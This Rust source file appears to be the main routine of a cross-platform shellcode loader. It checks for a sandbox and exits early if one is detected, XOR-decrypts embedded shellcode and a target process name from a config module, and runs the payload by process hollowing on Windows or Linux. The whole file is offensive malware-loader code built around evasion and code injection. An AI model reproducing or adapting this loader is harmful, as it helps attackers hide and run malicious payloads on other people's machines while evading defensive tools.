use std::str;

// Load the appropriate operating system's implementation
#[cfg(target_os = "linux")]
mod rco_process_hollowing_linux;
#[cfg(target_os = "linux")]
use rco_process_hollowing_linux::hollow_and_run;
#[cfg(all(target_os = "linux", feature = "antisand"))]
use rco_utils::pound_sand;

#[cfg(windows)]
mod rco_process_hollowing_windows;
#[cfg(windows)]
use rco_process_hollowing_windows::hollow_and_run;
#[cfg(all(windows, feature = "antisand"))]
use rco_utils::pound_sand;

#[cfg(not(feature = "antisand"))]
use rco_utils::pound_sand;

fn main() {
    if cfg!(feature = "antisand") {
        if pound_sand() == true {
            return
        }
    }
    if cfg!(feature = "xor") {
        let (shellcode, target_process) = if cfg!(windows) {
            (rco_config::ENCRYPTED_WINDOWS_SHELLCODE, rco_config::ENCRYPTED_WINDOWS_HOLLOWING_TARGET)
        } else {
            (rco_config::ENCRYPTED_LINUX_SHELLCODE, rco_config::ENCRYPTED_LINUX_HOLLOWING_TARGET)
        };

        // Decrypt the shellcode and target process so they are usable
        let shellcode = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, shellcode).unwrap();
        let target_process = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, target_process).unwrap();
        let target_process = str::from_utf8(&target_process).unwrap();

        hollow_and_run(&shellcode, target_process);
    } else {
        let (shellcode, target_process) = if cfg!(windows) {
            (rco_config::WINDOWS_SHELLCODE, rco_config::WINDOWS_HOLLOWING_TARGET)
        } else {
            (rco_config::LINUX_SHELLCODE, rco_config::LINUX_HOLLOWING_TARGET)
        };
        
        hollow_and_run(shellcode, target_process);
    }
}